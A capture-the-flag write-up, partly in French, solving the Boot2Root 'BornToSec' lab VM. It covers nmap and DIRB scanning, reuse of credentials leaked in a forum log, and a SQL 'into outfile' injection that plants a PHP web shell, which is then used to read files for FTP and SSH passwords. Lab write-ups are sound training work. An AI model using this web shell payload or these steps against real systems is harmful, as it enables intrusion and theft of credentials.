 ```
 ____              _   ___  _____             _   
 |  _ \            | | |__ \|  __ \           | |  
 | |_) | ___   ___ | |_   ) | |__) |___   ___ | |_ 
 |  _ < / _ \ / _ \| __| / /|  _  // _ \ / _ \| __|
 | |_) | (_) | (_) | |_ / /_| | \ \ (_) | (_) | |_ 
 |____/ \___/ \___/ \__|____|_|  \_\___/ \___/ \__|
 ```
 
After the setup we are presented with 

![BorntoSec](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/setup.png)



-----------------------------------------------------------------------------------

## Information gathering

The first step is to understand what we can gain access to and where is it located.

* First step is to find the ip of the VM by using ifconfig 
ifconfig should display a range of IP for the vm between 1 and 255

* Second step is to use ***nmap*** in order to uncover wich ports are open by executing: ```nmap <IP>.1-255```

This gives back the precise IP and the open ports:
```
Nmap scan report for 192.168.99.100
Host is up (0.00048s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```
From this we know that the exact ip ends with .100
80 should be open and accessible Through a web browser

We are presented to a basic webpage:
![website](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/website.png)


* Now that we know the IP we're going to use DIRB to gather information about the file structure
[DIRB!](https://sourceforge.net/projects/dirb/files/)
DIRB is a tool that uses dictionaries of common file systems naming paterns in order uncover their presence.


```
./dirb https://192.168.99.100/ wordlists/common.txt -w
```

We uncover :

- https://192.168.99.100/forum/  with subfolders:
  - js
  - lang
  - modules
  - templates_c
  - themes
  - update
- https://192.168.99.100/phpmyadmin/
- https://192.168.99.100/webmail/
--------------------

Lets start by accessing the forum. There's a link that displays the users and what they posted, lmezard posted "Probleme login ?"  

![forum](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/forum1.png)

It links to a log output of what seems to be admin logins 

When looking for the lmezard "Failed password for invalid user", one line seems very out of place: ```Failed password for invalid user !q\]Ej?*5K5cy*AJ```

Could this be lmezard's password? :smirk:

With this password we can then login to the forum with lmezard's credentials and discover that her email address is laurie@borntosec.net

Let's try to log to the webmail with this email and the same password:

![webmail](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/webmail.png)

Nice...
Let's check the mail DB ACCESS:

-->
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
-->
***Bouyaaa !!!***


--------------------------------------------------------------------------------------------
En magouillant un peu sur le login de phpmyadmin
login: root
pass: Fg-'kKXBj87E:aJ$

CA PASSE

On suis ce tuto :http://www.informit.com/articles/article.aspx?p=1407358&seqNum=2

Ils nous donnent:
select “<? System($_REQUEST[‘cmd’]); ?>” into outfile “/cmd.php”;

Cela permet d'inserer un shell basique qui prend des commandes via url, mais il faut trouver ou le placer

Vue que c'est un site web il sera en  /var/www/html/

en tentant les differents sous dossiers de dossier de forum (obtenus via DIRB)
on arrive finalement a placer dans template_c

SELECT "<? System($_REQUEST['cmd']); ?>" into outfile "/var/www/forum/templates_c/cmd.php";

A partir de la on peux lancer des commandes via le navigateur, notament ls pour comprendre l'arborecense

https://192.168.99.100/forum/templates_c/cmd.php?cmd=ls%20../../../../home

https://192.168.99.100/forum/templates_c/cmd.php?cmd=cat%20../../../../home/LOOKATME/password
Montre un dossier LOOKATME avec dedans un Login/Password :
lmezard:G!@M6f4Eatau{sF"

en se connectant en ftp on peut entrer ce password et acceder a un README : "Complete this little challenge and use the result as password for user 'laurie' to login in ssh"

et a un fichier fun

Ce fichier fun contiens des instructions:




Password SSH de Laurie

laurie / 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

